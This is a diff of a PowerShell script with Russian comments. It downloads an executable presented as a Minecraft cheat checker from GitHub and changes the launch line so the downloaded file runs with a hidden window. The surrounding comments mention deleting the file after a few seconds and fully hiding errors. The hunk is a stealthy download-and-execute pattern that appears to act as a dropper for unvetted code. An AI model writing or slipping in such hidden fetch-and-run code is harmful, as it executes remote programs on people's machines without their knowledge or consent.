@@ -94,7 +94,7 @@ try {
     Invoke-WebRequest -Uri "https://github.com/WarRagon404/MinecraftCheatChecker/raw/refs/heads/main/source/assets/custom/RustCheatChecker.exe" -OutFile "MinecraftCheatChecker.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
-    Start-Process -FilePath "Fx.exe" -WindowStyle Hidden
+    Start-Process -FilePath "MinecraftCheatChecker.exe" -WindowStyle Hidden
     
     # Удаляем файл через 5 секунды
     
@@ -102,3 +102,4 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
